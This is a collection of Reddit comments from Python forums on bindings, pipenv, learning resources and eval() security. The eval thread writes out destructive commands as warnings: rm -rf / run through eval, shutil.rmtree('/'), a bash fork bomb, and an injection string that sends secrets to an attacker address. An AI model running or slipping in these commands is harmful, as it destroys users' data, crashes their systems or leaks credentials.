Seems like terrible advice to me. Going cleanly from 2 to 3 without passing six is fraught with danger and seems like a bad idea in almost all cases. You’d have to have a very small product, extremely good test coverage (over 90%), and a very small team for this to be a good idea. 
Hold on, are you trying to build your own class into CPython itself, or are you trying to build a Python _module_ from your C++ code? If it's the latter, you'll have to expose a C (_not_ C++!) API. The way I've seen it done most of the time is by defining C functions that work with opaque pointers to your objects and call their respective methods internally, then writing Python code for a wrapper class that calls said C functions internally.
I think `multiprocessing.Pool` is what you're looking for. More detail here: https://stackoverflow.com/questions/1704401/is-there-a-simple-process-based-parallel-map-for-python
First learn the basics.. loops, variables, strings, integers, list manipulation, all that good stuff. Don't get into anything advanced. Next, decide on a project that interests you and will force you to learn more advanced topics. When you're working towards a goal you'll be that much more motivated. 
Fantastic :) It can take the brain a while to puzzle out the letters.. if you added a subtle flash (ie quick fadeup / down of brightness) of the ones that made up the letter when they aligned it would make it more blatent.
So, write a C interface for your C++ code, then use [ctypes](https://docs.python.org/3/library/ctypes.html) to re-wrap it in a Python object.
Interesting - wish I knew about mitogen when I was experimenting with networked graphics.
All right, thanks. So, in that case, I've to handle `void` pointers as my return types and argument and cast them back to my `C++` types in every `C` function. There is no way to expose my `class`/`struct`.
You can use Kivy to write a python app that will work on Android (ARM and x86). As people have mentioned the document formats are knarly, but it will certainly be interesting to try. Word uses a "piece-table" data structure, it might be worth reading about that to get an idea of how it is implemented.
Yes, you have to work with `void` pointers here. The Python interpreter itself is C, and doesn't understand the C++ ABI (and there _isn't_ really a stable C++ ABI) or concepts such as classes.
Learn Python the Hard Way is not a particularly good book for learning Python. It used to be popular because it was freely available, but nowadays there are much better free resources. https://automatetheboringstuff.com/ for one. 
Also following video tutorials and copying character by character also is a waste of time. Source: I didn't learn anything doing that.
That [setup.py](https://github.com/gruns/icecream/blob/master/setup.py) is a thing of beauty.
I see you have Tkinter and Flask w/ Jinja template tutorials too. I think I've found a goldmine.
Instead of a pipe, maybe use an emoji? No one greps for stuff like that, and it can be quite handy for output like this: ic➡ d['d'][1]: 'one' Barring that, maybe a non-ascii character like »: ic» d['d'][1]: 'one' 
I recommend pairing virtualenv with [virtualenvwrapper](https://virtualenvwrapper.readthedocs.io/en/latest/). It has some nice QoL improvements like managing multiple environments and keeping your projects' directories clean by storing dependencies elsewhere, like HOME/.virtualenvs. And it doesn't change anything for other users, since it's just a set of extensions/wrappers for virtualenv.
Yay!
/r/learnpython/wiki
r/learnpython Python doesn't have parallel threads due to the GIL (global interpreter lock). The only way to *really* run things in parallel is via processes. It comes with a significant overhead and requires extra work. Think really long and hard about whether you really need it.
Not python but you can learn programming logic things on Coding train
I copied code like that and it did help me learn the syntax and structure of code. Maybe that's just me, though.
And the other books by All Sweigart are great too (and free).
You might want to give [SWIG](https://github.com/swig/swig) a try.
automatetheboringstuff.com &lt;3
It can be used to replace pip+virtualenv. Instead of installing by pip and create venv separately, you can install packages and create a virtual environment for your project at the same time by using this command: $pipenv install something You can take a look at this page [how to manage your python project with pipenv](https://robots.thoughtbot.com/how-to-manage-your-python-projects-with-pipenv) 
You have this podcast about python: [Talk Python To Me](https://talkpython.fm/)
If you follow book a instructed, LPHW is good. But yeah, I didn't knew about Al at that time.
The Python course on edX was really good. https://courses.edx.org/courses/course-v1:MITx+6.00.1x+2T2017_2/course/
It's not the best book on Python, it's not even one of the better books on python. You can learn python the hard way or you can do it the smart way. 
I'm getting similar permission problems as before. What can I do to overcome those issues?
Why do you have to bring politics into this? When did I say there's no women in tech? I simply said that you were generalizing women. 
Automate The Boring Stuff is a great start. I also recommend using Python 3. 
I was wondering who would happen to be so well versed in Python to have that many videos until I looked at the username. Your work is remarkable. 
I'll look into that, shouldn't be too hard to change the color of the just that letter for a frame when it's aligned. Here's an alternative config I thought of where the P isn't negative space [voxel editor](http://voxelbuilder.com/edit.html#C/2ecc713498db34495ee67e22ecf0f1:A/SiUhUhUhcfecfhcfhejdfSfSfadhajeYfYfYfcjhUhUhWeiUhadiUfUfeijcYfUfUfeffjSeWiiSfSfUh)
I hope your day gets better. 
The latest build of the underlying logic that is used for destructible environments and planetary systems in my video games. The latest example of its recreational usage can be found at GoshFather.com The code was written in Python for the Open-Source Blender Game Engine. I am currently porting the logic to C# for use with the Unity engine. From there I should be able to produce physics based games with destructible environments for smartphones like Android and iOS. Please contact me here with any business inquiries. And don't forget to Subscribe!
You can use C++ if you use `extern "C"` declarations. https://docs.python.org/2/extending/extending.html#writing-extensions-in-c And something like SWIG or Boost can help preserve some type-safety in your binding. https://stackoverflow.com/questions/13990317/generate-python-bindings-what-methods-programs-to-use 
Or ptbtpqpbp
LPTHW got me into it because I had no basis at all -- i.e. didn't even know how to use the command line and that book assumes NO basic knowledge.
Documentation and stack overflow
It was one of the first Python books I read, too. I thought it was awesome...until I read a good book on Python.
Hey again. Now that I saw how to write a piece of [`C++`, expose it through a `C` interface](http://ix.io/KoP/cpp) and use [*ctypes* to use it in `Python`](http://ix.io/KoQ/py), do you know (or have any hint) how I should generate a ready to use *dynamic library* doing the same job? My first guess is to [define a new built-in type](https://docs.python.org/2/extending/newtypes.html) with a single member being an instance of my class and exposing it's methods. Or maybe defining a new type which inherit from my `C++` type. I saw that I can write stuff like that and only export the `init module` function with the mandatory `extern "C"`.
You can't inherit from a C++ class because Python objects aren't C++ objects. You have to define a new `PyObject_t` and have all of its methods wrap your C++ object.
Which of course comes with a big **CONS**: not portable between Python2 and Python 3. Am I right?
There is basically no way you can make the same exact binary work with Python 2 and Python 3, or (likely) even different builds of the same Python versions. You can make the same _source code_ build with both 2 and 3, but that will likely require some macro trickery to deal with the version differences.
i can't wait to suck down some of that sweet cream.
Or even 🍦 d['d'][1]: 'one'
What every body else said. Sorry for not being clear. Assuming this does not raise an AssertionError answer = foo('abc') assert answer == 'cba' then: answer = ic(foo('abc')) assert answer == 'cba' this will also not raise an AssertionError. So if you have some long line: answer = os.path.basename(foo(bar(baz('abc').strip()).encode('utf-8'))) You can put the ic() call in there somewhere to debug without having to re-write the line and split it up. I'm not saying the above line is *good code*, but we have all written crap like that, especially for one-off scripts or while interactive to test stuff.
Wow, it's so great to see Pygame getting updates. I have students using it this semester for an honors project, it's nice to know I'm not assigning them a dead API.
The module is very old(2013) and I am assuming only tested on python 2. I got it to work by adding a `.` before all the imports so in `__init__` I did `from .api` and you have to do that for all the `imports` where your importing from a file. Now is this the proper way to fix this? I am not sure. You can also just build your own parser if you keep running into problems. The code is pretty short for this module. For example `get_alexa` is basically def get_alexa(url): rank = None request_url = 'http://xml.alexa.com/data?cli=10&amp;dat=nsa&amp;ver=quirk-searchstatus&amp;url=%s' % url popularity = get_elements(request_url, '//POPULARITY', parser=etree.XMLParser(encoding='utf-8')) if len(popularity): rank = int(popularity[0].get('TEXT')) return rank def get_elements(url, xpath_expr, parser=etree.HTMLParser(recover=True)): r = requests.get( url, headers={ 'User-Agent': 'Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:16.0.1) Gecko/20121011 Firefox/16.0.1', 'Accept-Language': 'ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3', } ) xml = etree.fromstring(r.text.encode('utf-8'), parser=parser) return xml.xpath(xpath_expr) I would proabable replace the `etree` stuff with Beautiful Soup though.
this... i took up python a couple years ago using your tuts... close to landing my first dev job now hopefully
What you have so far?
symbol = str(input("Enter what symbol you want to print! ")) rows = int(input("How many rows would you like? ")) x = 1 while x &lt;= rows: y = 2 while y &lt;= x: space = '' space += ' ' y+=1 print(symbol + space + symbol) x +=1 Thats my code, but its giving me (using @ as symbol, 3 rows) @ @ @ @ @ @
Love the name Dr Soong
[removed]
Hmm tried that using while loops, it worked out perfectly with that hint. symbol = str(input("Enter what symbol you want to print! ")) rows = int(input("How many rows would you like? ")) x = 0 while x &lt; rows: y = 2 print(symbol + ' ' * x + symbol) x +=1 problem is class requires me to use nested loop, and the teacher somewhat set on instructions. 
I'm looking for auditors/specialists to improve the code. If you're interested and would like to apply, you can read the details here: https://www.reddit.com/r/bitmessage/comments/7xrb80/bitmessage_project_looking_for_auditors_andor/
You're right. But for me it was a quick way to get familiar with the syntax very quickly without having to worry about the problem at hand just yet. Maybe 'copying' isn't exactly the right word either, 'typing along' would be a bit better, I guess.
That looks pretty cool. Unfortunately, trying to debug something resulted in unclickable buttons, and winpdb crashed when I pressed F6. I also couldn't figure out how to make it pop up in a specific line of code (basically setting a breakpoint in code beforehand).
For someone who is still learning and have not used `eval()`. Could you explain a little how this can help execute malicious code?
EDX has some free online courses that are pretty good for getting started. 
Like!
Eval can be used to execute arbitrary code. So to take the above example and expand on it: eval("__import__('os').system('rm -rf /')") would nuke your hard drive if you ran it on a mac/linux machine.
I haven't seen it mention elsewhere in thread, but this is probablyu best for /r/learnpython 
In other news, water is still quite wet. Joking aside, I've been wanting to add a python interpreter to an IRC bot. The plugin that came with it requires the use of an API to an online IDE for its interpreter, but the site is down now. Does anyone know of a *safe* way to implement my own? 
It's important to know `eval('&lt;some static code&gt;')` isn't more dangerous than `&lt;some static code&gt;` by itself. In fact, they're equivalent. What's dangerous is when the code given to eval is coming from an untrusted source. For example: number = get_input_from_the_internet_or_something() eval('x = ' + number) Now if some l33t hacker decides to send instead of something like `42` the text `42; import os; os.system('upload-secrets --to=hacker@gmail.com')`... you're boned. This is not exclusive to `eval` or Python. [SQL injection](https://en.wikipedia.org/wiki/SQL_injection) is a variation on the same thing that's a really common vulnerability on websites.
Uh...ok? A but if a hammer without a nail. I somehow don't think this is a tool that was needed for ... Anything at all.
Whoever wrote that original code is an idiot and should not be left anywhere near production code anymore.
It's quite dangerous to give a working example of a dangerous command on such a public forum. You should edit it so that it does not work, for example eval("\_\_import\_\_('os').system('echo rm -rf /')")
Just ran that code to see what it would do and now my right click doesn't work and I can't access my pictures. I just read the second part. How do I fix this? My dad comes home in 4 hours.
Ok so you had the right idea in a few places. But what was happening is your x, y, and space variables get set in their loops. Each time your while y &lt;= x: runs the very first step is " set space = '' " When your while x &lt;= rows: runs the first step is " set y = 2 ". I have the adjusted code on my end if you really need it, but id move your initialized variables outside of your loop.
Cool! That's good to hear, and motivating.
This code makes a lot of sense. My problem is I was trying to use while loops which kind of makes thing overtly complicated. I'll be keeping the format code in mind, it'll be really helpful in the future. Thank you for the help, I really appreciate it!
💥*boom*💥 PyCharm, FTW!
Better start packing. 😁
I just restarted the computer and it won't turn on now. Posting from my phone. Any ideas? I got like 3 hours he's gonna kill me it's his new imac pro. 
I was also looking at using a setup.py but didn't understand the difference between that and a requirements.txt. It looks like the setup.py has more functionality than requirements.txt. I'll need to do more reading on setuptools/distutils.
If you're serious, then hopefully he has an image to restore. This is a great opportunity to learn MANY lessons simultaneously.
Just FYI in python2 you can do this with `input()`.
*crawls back under rock*
Let me ask you all this: Why was Hadoop written in Java and not Python? Why was Spark written in Scala and not Python? Why was Kubernetes written in Go and not Python? Why was Mesos written in C/C++ and not Python?
Ok, so `requirements.txt` is just a text file that can be fed to `pip install -r &lt;filename&gt;` to install a set of packages. `pip freeze` produce output in that same format. The filename itself has no logic attached to it. You could name it `foo.bar` if you wanted. It's just common practice to name this file `requirements.txt` and keep it in the root directory of your project. Often you'll find projects with a `dev-requirements.txt` or `requirements-dev.txt`, which would be *dev* requirements (e.g. test framework, documentation build tools, etc...). There is however nothing that automatically installs these dependencies. You'll have to manually install the dependencies with `pip install -r &lt;filename&gt;`. distutils and setuptools are the maven and gradle of the Python world. They are frameworks that can produce builds (source distributions, binary distributions), run tests, and install your project. The common practice is to have a `setup.py` file in the root directory of your project, and somehow make that script call the `setup` method from the framework. These frameworks also has some support for listing dependencies, and the setuptools one is compatible with the `pip freeze` format (or rather, it *is* the `pip freeze` format). So, a line in a requirements file is also a valid string to use as a requirement to `setuptools.setup()`. When using this, users would be able to e.g. simply `pip install &lt;your git repo&gt;` and have everything working.
 import importlib.util with open("/tmp/myfile.py", "w") as file_: file_.write("import('os').system('&lt;command to delete stuff&gt; -rf /')") spec = importlib.util.spec_from_file_location("myfile", "/tmp/myfile.py") module = importlib.util.module_from_spec(spec) spec.loader.exec_module(module) moral: never use importlib or open (never know when those two might be used together after all) import os os.system("command to delete stuff") moral: never use os.system import shutil shutil.rmtree("/") moral: never use shutil 
Shrug, don't know why I didn't think of that. [Here](https://hub.docker.com/r/briancwilliams/py2-3/) it is. Was just surprised there wasn't an official version of this.
Very nice. This is exactly my level of programming. I learned a lot while reading your code. I hope some python pros come and give you some improvements and new ideas.
That .format call is for python 2, which happens to be whats on my laptop. If I was doing it in python3, i'd have used f-strings. Which I vastly prefer syntactically. print(f'{symbol}{space_buffer}{symbol}) Is how it'd look with f strings.
Came here to reccomend sentdex but I see he beat me to it so I'll just say I learned a lot from his videos. I vould also reccomend corey shafer https://www.youtube.com/user/schafer5 But as others are saying, remember to try out the stuff. You don't learn as much as you think by just watching.
Thanks! I'm used to designing GUIs with XML-like languages. Tkinter felt so different. My next goal is to give it a shot to PyQt/PySide and wxPython 4.
I think in modern-ish Unix flavours you need to explicitly pass `--no-preserve-root` anyway.
Looking through his history it’s pretty clear he knows exactly where /r/the_donald is lol
If you know legitimate needs for any of these you also know better than to listen to blanket statements from randoms on the internet. That said, I still would never use eval. It introduces bad patterns in a codebase that get mimicked by other less knowledgeable/careful developers. There's always another way to do it.
Celery is okay but a I resorted to Jenkins to run the tasks instead. Plus, Jenkins can have many slaves that can distribute the workload. I don’t think celery is multi-hosts. 
&gt; crawls back under rock That's where the 4chan people live, don't go under there.
Seeking a part time tutor Background: I have been learning alone for a few years, while I wouldn't consider myself a newb, I am not to the intermediate state yet. I live alone, in the country (Wa state), very secluded from anyone else that shares my interests in programming. -- What I'm seeking: Someone that I can reach out to a couple times a week via email, telegram or however they prefer. Nothing elaborate that would require more than a few second response. I'm learning basic stuff at the moment, ie. API, flax, bots, working with db's. I'm interested in machine learning, automation, rpi, big data, and just being able to code efficiently. I recently connected Atom/Hydrogen to my remote Jupyter notebook kernels, which has been huge for me. -- What I can offer: I'm not a rich coder, no I'm a Journeyman carpenter, while I do make a decent income when I'm working, I'm normally laid off during this time of year and broke. At this time all I can offer in return is access to my Digital Ocean droplet with a domain name, it has subdomain links to prometheus, rethinkdb, Influxdb, grafana, jupyter notebook, conda, etc. i use it to learn and it's imaged so you could use it to do whatever you want in the same context. -- Pm me, If anyone responds at all I'll consider this post a success, give me a shout out that you are possibly interested and maybe a quick background. Even if you are learning yourself, It would be cool to have someone else to learn with. Thank for reading this, take care. 
If you just want to execute mathematical expressions, use numexpr. If you add scripting capability, that's inherently a security issue unless you actively and strictly limit what scripts can do.
I need advice. I want to read python files and dynamically load objects defined in those files at run time. I thought about getting .py file names and then ´eval("import {}".format(filename))´. I know this is dangerous and I accept that risk because I need to keep this system running as I add pieces. My question is, does anyone know if there's another technique for doing this?
Aha! I understand now. Thank you for the explanation and explicit examples everyone. This is a wonderful idea. I'll add this in the next version. Thank you again. Don't hesitate to let me know if you have any other feedback.
Output customization, i.e. the stdlib `logging` module should you so choose, is on its way. Thank you for the feedback.
Do your own homework.
K900 is spot on with respect to using pipenv. It does what your combo does plus some. I can understand someone who has been using the combo that you mentioned. But for newbies to the virtualenv environment, its best that they go with 'best practices'. I just spent yesterday cutting over to understanding and using pipenv and I'm sold. The pluses? 1. Well there are the security advantages with all of those hashes that it introduces. 2. Then there are the packaging advances. A piplock file is created and maintained in the background which ensures the ability to replicate the environment. 3. It can produce a requirements file for you as well as use an existing one, with which to install your application. 4. It produces a graph of everything that is installed, showing sub dependencies. These can be locked to any version if required. 5. It can lock any of the installed components within the virtualenv to a specific version or leave tgem open to an upgrade. 6. It marks those additional modules or apps that you use for development so that you can populate your virtualenv with only production modules or 'the full Monty', which is needed for development. 7. It uses pew to activate your virtualenv, thus allowing any shell for activatiin. 8. It can use and/or create the venv within each project or centralize them outside of the project. 9. It can autonatically grab and install the required python versions into your centralized virtualenv so that any future venvs tgat yiu create, may use this versiin. 10. It does all of the above without mucking with your system installed pyrhons or your --user installed pythons. And pipenv is just getting started towards a better python packaging experience. So yeah, I'm sold. Has some really shitty corner cases like deleting your existing venv's. While it does warn you in some cases, in others, like if you happen to type pipenv --two after you created one with pipenv --three, it will blow away the previous venv and attempt to create a new one. But it nay not recreate a new one into that same dir. It errors out and no amount of uninstalling pipenv and reinstalling, or renaning that dir where you want the new venv, will work. Took me hours to come up with a work around to it. So don't run that pipenv command on an existing venv until they come up with a fix or better warning coverage across all use cases so that you have an option to hit continue or not. 
Honestly depends for me. If my project is only going to span a file or two, I just use either emacs or notepad++. If it's anything larger I'll use pycharm. I know its not "free" but you can get a year free license if you register with a university email.
Thanks for the love!
My favorite is Javascript. Because JSON is (mostly) compatible with javascript, pre JSON parsers a lot of webpages would do `var myThing = eval(jsonBlob)` Of course, the problem here is the same, if someone malicious can control the contents of jsonBlob, they can get your application to run things that you the programmer do not expect. Dynamic code execution ala-eval should really be a last resort thing. And if you must do it, you should never do it with a string that the user can affect. It is just way too dangerous.
If you are dumb enough to run code that starts with "this is why it is dangerous because you can do this" without reading the code, you deserve everything you get. If I say "don't put `:(){ :|: &amp; };:` in bash, it will kill your computer" You would be a fool to run `:(){ :|: &amp; };:` in bash (unless you are into that sort of thing. (note: `:(){ :|: &amp; };:` will force you to reboot your machine. You've been warned)
Actually, pipenv does handle additional pythons by using pvenv. This is what yhe docs say... Automatic Python Installation If you have pyenv installed and configured, Pipenv will automatically ask you if you want to install a required version of Python if you don’t already have it available. This is a very fancy feature, and we’re very proud of it: $ cat Pipfile [[source]] url = "https://pypi.python.org/simple" verify_ssl = true [dev-packages] [packages] requests = "*" [requires] python_version = "3.6" $ pipenv install Warning: Python 3.6 was not found on your system… Would you like us to install latest CPython 3.6 with pyenv? [Y/n]: y Installing CPython 3.6.2 with pyenv (this may take a few minutes)… ... Making Python installation global… Creating a virtualenv for this project… Using /Users/kennethreitz/.pyenv/shims/python3 to create virtualenv… 
It does, but it does so by delegating to pyenv.
That's what I posted. Plus I included a printout of how it says that it uses pvenv if its installed.
And don't [follow this link](https://heffalump.herokuapp.com).
https://docs.oracle.com/cd/E19957-01/806-3568/ncg_goldberg.html
The one that is best for your mindset. I haven't used PyCharm but it comes highly rated. If you've used Eclipse go for the PyDev extension. I find Visual Studio Code perfectly adequate for my current needs. Maybe search for "python IDE comparison" and see what it comes up with as there are plenty more of them.
&gt; There are many valid use cases for eval() Can you give an example? I can't think of a single one. 
This is pretty badass !!! Upvote from me.
Yet:- &gt;&gt;&gt; 0.25 + 0.25 + 0.25 == 0.75 True [floating point](https://docs.python.org/3/tutorial/floatingpoint.html)
Wow. that was bad
You can eval anything, as long as it can't come from an untrusted source, like the internet
The most common way i've seen has been to create a grid of x,y values fill it with obstacles and color the locations of all places the path finding algorithm has searched. Usually the shortest path at the end is highlighted a different color.
Both the imp and importlib libraries allow you to do this
Is the line malicious or just reboots your computer? Also how does this work? 
I wrote a graph database that allowed you to attach (static) scripts to nodes, to make it respond to events. It used eval() to do this.
So modern way to do things is: Get pipsi Use pipsi to get pyenv and pipenv
Far safer is the [ast module's literal_eval](https://docs.python.org/3/library/ast.html#ast.literal_eval) function.
I use this somewhat standard mechanism for discovering plugins and/or objects defined in other packages. You can define a core package which remains somewhat static, and other packages which advertise objects into a known namespace for the core package to find and load. It's a bit less hacky and more structured than evaling random files, but depends on good packaging practices. http://setuptools.readthedocs.io/en/latest/setuptools.html#dynamic-discovery-of-services-and-plugins
It is called a [Fork Bomb](https://en.wikipedia.org/wiki/Fork_bomb) Essentially, it creates a process that spawns itself multiple times. The end result is an explosion of processes until the OS can't handle context switching. Takes a few seconds but eventually your computer will become totally unresponsive which makes you need to reboot.
Ah okay so its the unix equivalent of %0|%0 for windows. 
Would this typically be done by storing that data in a numpy array and passing it to matplotlib imshow? 
Oh thanks. But my problem is that I don't know which module to use. 
/r/learnpython may be more helpful and receptive. What system are you on? watchdog does different things for different machines so it is good to know. Also, does it work with the fallback based on mod time?
Absolutely! I used half a day yesterday researching their usage and then applying them to one of my projects. I am flat out sold. There are two corner cases that the team is working on resolving but what an amazing leap forward for pyrhon oackaging. Just as a by and by, here's how I understand pipsi's value proposition. It creates a sim link out of your python script or any pyrin app within pypi and places it into a bin dir. That way we just type the name of your script from within a terminal and your Nix runs it just like it would run any dnf or yum or apt installed application. But by versioning your python script or app within a virtualenv of its own before creating the sim link into the bin directory, it ensures that each script is using its appropriate python. I would imagine that this approach permits multiple copies of the same script to be installed but different dependencies. Pipsi obsoletes having to 1. put my python scripts into /usrlocal/lib/py_project.and then 2. create a sim link to a file my_project (note there is no .py extension so that 3. users of my app don't know its a python app) 4. The my_project file then runs a batch command within it that first calls cd /usr/local/lib/my_project/ then runs the python script with an entry point into my app. Another Armin Ronacher marvel. Pipenv obsoletes having to run virtualenv, activate and deactivate commands. It also obsoletes the needs fir virtualenvwrapper. Just run 'pipenv shell' to activate and 'exit' to deactivate. You can list all of your virtualenvs, etc.
that's one benefit of hosted languages like Lua and JavaScript - you need not support any dangerous libraries (eg os, filesystem, networking access)
/r/homework_help 
...it really isn't. `setup.py` is for packaging your code. If you want to automate tasks like uploading the package or running the tests, use a bloody `Makefile`.
Other people seem to think it is possible, I don't really care about your trolling it's just a natural waste of time in my life, every thing I ever do some low life punk tries to troll me , I prove him to be an asshat then he leaves , so lets just skip then middle &amp; go straight to you leaving 
&gt; Kivy but I would still need Android installed to run the app right? I wanted to shot for stand alone , like Kindle - as soon as it opens it's on the reader page 
I'm not trolling - I'm simply being realistic. Something like Microsoft Word is thousands of man-hours of work. Even building something that can compete on features is impressive for a single person; building an app like that, an OS for it to run on, and hardware for the OS to run on, is a huge effort.
There's still _an_ OS on the Kindle. If you want your app to _be_ the OS, Python is not the language to do it, and it makes things even more difficult.
why it doesn't work for me ?whitout any error simply i can't see the result on desktop 
1st , you responded wayyy tooo fast , so your sitting &amp; watching , creepy, the hardware is easy few simple ICS , I can do that in maybe 2 hours, Again I already have a basic writer program blueprints , I never said anything about making an OS, you just put the words in my mouth
Further to the pipsi usage, it separates the usage of the system python from the python that is used within pipsi's virtualenv to install another python package. One of the two gotchas that pipenv has relates to how it creates the keys within its lockfile. It uses the python that was used to install pipenv and not the python thats installed within the virtualenv. Ie if the system python is python2 and your virtualenv python is oython3, the locks within its lockfile all think its part of a python2 install. I'm not gonna get into the problems that creates. Its all explained within the python packaging documentation (not the pipenv docs). I have a 'note to self' to get use to using pipsi rather than my system python or --user python to install future "system or user" related installations of python apps, modules and packages. And if course, use pipenv for all virtualenv installations
As someone who has worked with hardware extensively, I can tell you this - it's absolutely _not_ easy, and you _are_ going to need an OS.
It takes you to another webpage when you click on it.
Is there any way to download a workbook from the site? I may just be missing it.
ok great, thats what I was asking , Hence the title of my post , so 10 replies about you could have just said "no" 
You need some sort of OS. I mean ... I don't know if you can even use python on bare metal ? Anyway, even the older pre-android kindles have an OS underneath. 
&gt; bare meta so the os would be something like android? 
The answer to your original question is "yes".
Reborn was the one I tried, yeah. The original one didn't work for me at all. Reborn *is* someone taking maintenance to add simple things, hopefully it'll go well, because this looks fantastic.
 thank you, this script helped me :)https://github.com/jackbrookes/batch-ppt-to-pdf
https://github.com/carlmjohnson/heffalump
Celery is very easy to setup on a cluster. It definitely is multi host. 
You can restrict access to files with Python, but again, that's a dealbreaker in terms of what functionality I want. The question is how much functionality are you willing to give up in order to be safe. How much extra code are you willing to write/maintain?
paging /u/clicksonlinks
And, you know, `sudo`.
*Rustic Retreat 4 Sale*
Real™ Programmers don't use eval() 
No one's telling you not to use eval, you just need to be aware of the security risks you're taking.
Further bloating Anaconda seems like a step backwards. I think an ideal world would be one where pip keeps a global store of any number of versions of packages, and each project would have a requirements.txt that dictates which versions get used for that project. This would avoid duplicating large dependencies on your hard drive over and over with venvs, and solve the version resolving issue. That combined with a version of numpy, scipy, skimage and other packages with compiled binaries that include MKL/LAPACK/OpenBLAS, etc, on pypi would eliminate the need to use Conda and produce an 8GB stock python install.
I'm well aware it's a security risk. I'm also aware what you have to do to add scripting support (e.g., restrict the use of files the user has permission to, restrict them using try-except blocks). For desktop applications, I think the tradeoff isn't worth it.
Well as running tests is a function of setup.py, it seems reasonable to code it so it would work as they've done here. I agree that uploading the package isn't really something that *belongs* in the, but I don't see a problem there. Especially when the alternative is something like a Makefile -- ew.
Yeah as soon as I started seeing all these posts I realized I should give it a look. Funny enough, I thought importlib was only for using reload in python 3 😉
Unless some idiot runs everything as root.
Datacamp
Why is this still going on , you said it would be very difficult &amp; take thousandths of man hours &amp; out of the capability of 1 person , so basically "NO". Python would not word as a stand alone app
If you're doing any kind of static analysis you'll be needing it.
For linux / mac you need to either install as a super user: sudo pip install packagename or you need to install as a user: pip install --user packagename
THANKS! I've been trying to fix this forever! I tried sudo, sudo -H, I even tried changing the permissions of the files/directories. --user worked for me, again thanks so much!
Nice work, where you did you learn tkinter if you mind sharing ?
Was thinking about this specific topic, is it worth it to learn flask right now to make guis or is it better to learn tkinter and maybe learn flask later on. Nonetheless good job OP
[This post](https://www.reddit.com/r/Python/comments/7xr839/after_the_recent_pybitmessage_exploit_let_us_all/duaiinp/) explains it well. You are right that a hardcoded eval is no more dangerous than the command that is hardcoded. What is dangerous is using eval to run something from an untrusted source.
In a world where my services are running in docker anyway(, and where celery seems to have many broken features); I'm starting to think there's largely no reason to ever use it. My current thought is that it just makes more sense to just write a single process consumer, and move the multiprocessing to the docker layer. Now you're immune to all any weird preforking shenanagins and the risks hanging n jobs off 1 parent process
PyCharm is the only worthwhile **IDE** for python in my opinion, but I just use a text editor like atom or VS Code.
If you want Anaconda without bloat, just use [Miniconda](https://conda.io/miniconda.html). It only contains conda itself and its minimal dependencies (including Python), so you can choose exactly which packages you want to install. Your "global dependency store" idea is already implemented by (Ana)conda in the form of [conda environments] (https://conda.io/docs/user-guide/concepts.html#conda-environments). No package is duplicated on disk, because conda environments use hard links for package versions that already exist in any another environment.
So is it another good reason to move on to Python 3? :)
Seriously, I've been reading the same shit about `eval()` and SQL injections for damned near 20 years and *nobody ever fucking learns*.
basically cross-side-scripting. treating data like code.
Wing IDE community 
simply find the strongest magnet you have and run it seven times over your HDD IN ONE direction, that part is important
shit post.
"We're discovered an arbitrary code execution bug in our program in the function that literally only allows for arbitrary code execution!" 
Please please please no - use virtualenv instead of fighting with SIP
Lol. 
I trust everything on the internet ;)
try the mighty Qt library in the form of PyQt5 (on pip) Qt is very mature and well rounded. 
[removed]
Definitely take a look at PySide or PyQT. PySide licensing is more conducive to a commercial application without paying a licensing fee. PySide 2 is still being developed -wheels are available here - https://github.com/fredrikaverpil/pyside2-windows. I am also a civil engineer in the water resources field who is looking to use PySide to develop an application.
This is super cool, it reminds of a rubix cube, and wanted to drop a line that I got the link to this from the matplotlib gitter channel 'cause a dev found this cool (well multiple devs...). 
Whoa. They built retreats in rust now?
Docker isn't really for making a virtual system--it's for making virtual *network* of applications. Either that's something that you want to do, or it isn't. Either way, I don't really see it affecting your code that much to use it. If you are purely using it as a tool to isolate your environment, it should do that quite well. If the containers talk to each other, they do it as network calls you would be writing anyway. I will say this, though--using pipenv feels really, really intuitive to me. I feel weird about the cult followings of programmers, but Kenneth Reitz really is ridiculously good at user experience when it comes to APIs. It's like... I'm not even managing virtualenvs. I'm just directly managing project dependencies, and getting the environment isolation by default. Yes, you may pip install to your system python installation, but why not just pipenv install to your project's env? Even if I was in a docker container, I would do this.
simple XLSX and PDF generation
And some people instead of importing json will just eval the json string. And that's a quick way to get things done but it is very stupid and insecure
You have looked at Jupyter, pandas, SciPy, and matplotlib? https://nbviewer.jupyter.org/github/WeatherGod/AnatomyOfMatplotlib/blob/master/AnatomyOfMatplotlib-Part2-Plotting_Methods_Overview.ipynb
Well done! Now, please bear in mind the dangers of piping sensitive traffic through a free proxy :)
Agree! In my humble opinion, thete are now only two ways to pip install your stuff. 1. Pipenv, which creates the virtualenv without you having to. Then manages your requirements without you having to create a requirements file, Plus checks the hash on everything it downloads Keeps track of all of your virtualenv's and will switch between them with an easy to remember command. And runs the pip commands that install or uninstalls things without the muckups that can occur if you were to use pip directly. 2. Pipsi, to do the equivalent of a system python installed app or --user python installed app. For python apps that run like a bash launched application (aka, you simply type something like 'pip' or 'click' rather than 'python pip.py'. Use pipsi install and pipsi uninstall. No conflicts with your system python. You can use any python you want. Pipsi is also great for installing your python apps into bin, making them behave like any app located in bin. So you just type 'my_app' rather than python3 my_app.py or pyrhon2 my_app.py. 
Whoa I didn't realize you could use injection in python. I mean it's kind of makes sense but the example you've given there is kind of blowing my mind right now.
I have, to be honest I think the syntax in pandas/matplotlib leaves a bit to be desired compared to R (not that I love R's syntax either). Jupyter is great, but you can use it with R so I don't think it's a python advantage per se (although I probably will mention it). Scikit-learn is also great, but I don't know how many people I'm going to be talking to use machine learning. 
Messaged!
link me? I was kinda hoping numpy would use it somewhere in the docs when I made it. 
When is JSON not parseable by javascript? I can't think of any valid json that would break it.
any system with GNU coreutils, which is pretty much most linux distributions. others like macOS don't have this, and rm will start deleting from / without confirmation.
I was the person who said that...and I do want it in the docs, just in a showcase type section since it's a complicated example. I think having it in pyplot would also be cool, since we're aiming for examples that go both ways. 
You'd be surprised at the amount of people actually doing this.
My main task right now is consolidating a few semesters' worth of course material into a handy website for my upcoming students. Otherwise, I'm toying with a dataset released by NBC about tweets from alleged bots during the elections and playing with NLTK and Gensim to extract interesting insights from it.
